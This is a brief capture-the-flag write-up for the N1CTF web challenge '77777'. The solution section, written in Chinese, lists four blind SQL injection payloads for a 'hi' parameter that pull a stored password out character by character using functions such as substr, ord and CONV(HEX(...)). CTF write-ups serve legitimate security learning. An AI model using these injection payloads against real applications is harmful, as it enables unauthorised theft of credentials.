# 
## Challenge details
|       Event        | Challenge | Category | Points  |
|:-------------------|:----------|:---------|:-------:|
|       N1CTF        |    77777  |    Web   |   104   |

### Description
> "77777" is my girlfriend's nickname，have fun xdd:)
### Attachments
## Solution
网站中给出的核心代码为  
  
`hi=000 where ord(substr(password, 1, 1))>100`  
或者  
`hi=*CONV(HEX((SELECT MID(password,1,3))),16,10)`  
或者  
`hi= and mid(password,'+str(i)+',1) like "`  
或者  
`hi= *ord(substr(password,i,1)`  
## Link
